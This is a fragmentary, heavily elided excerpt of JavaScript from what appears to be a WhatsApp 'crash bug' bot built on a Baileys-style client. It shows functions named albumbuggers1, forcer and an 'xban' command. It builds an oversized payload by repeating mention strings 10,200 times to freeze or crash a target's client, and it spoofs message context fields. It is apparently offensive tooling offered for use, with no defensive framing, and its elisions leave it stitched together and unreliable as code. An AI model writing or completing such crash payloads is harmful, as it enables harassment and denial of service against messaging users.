...
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @VikingTY") + "\n\n\n";
    jidds = [];
    xeontex += "*~@201002604591~*\n*🦄*\n*~@201002604591~*\n".repeat(10200);
    jidds.push("201002604591@s.whatsapp.net", "201002604591@s.whatsapp.net");
//bug database
...
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/ztcirt.png",
sourceUrl: link,
mediaType: 1,
			...
			await XeonBotInc.relayMessage(X, {
					"extendedTextMessage": {
						...
						"contextInfo": {
							...
							"placeholderKey": {
								"remoteJid": "201002604591@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
...
async function albumbuggers1(target, mention) {
  ...
  const imageCrash = "https://files.catbox.moe/ztcirt.png";
...
async function forcer(isTarget){
  ...
  key: {
    ...
    participant: '201002604591@s.whatsapp.net'
  },
  ...
  fromMe: true,
  isGroup: true,
  sender: '201002604591@s.whatsapp.net',
  participant: '201002604591@s.whatsapp.net',
  mtype: 'conversation',
...
case 'xban': case 'XBODYban': {
    try {
        ...
        const imageUrl = "https://files.catbox.moe/a9m323.jpg";
...
let buttons = [
    ...
    let buttonMessage = {
        image: { url: `https://files.catbox.moe/ztcirt.png` },
	    gifPlayback: true,
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
        ...
        await XeonBotInc.sendMessage(m.chat, {
            ...
            contextInfo: {
                ...
                externalAdReply: {
                    ...
                    title: ownername,
                    body: botname,
                    thumbnailUrl: "https://files.catbox.moe/a9m323.jpg",
                    sourceUrl: link,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
    ...
    const oke = await XeonBotInc.sendMessage(from, {
        ...
        contextInfo: { 
            ...
            "externalAdReply": {
                ...
                "mediaUrl": 'https://files.catbox.moe/ztcirt.png',
                        ...
                        buttons: [
                            {
                                ...
                                buttonParamsJson: JSON.stringify({
                                    ...
                                    phone_number: "+201002604591" // استبدل برقم الهاتف الفعلي
                                })
                            }
                        ]
                    }),
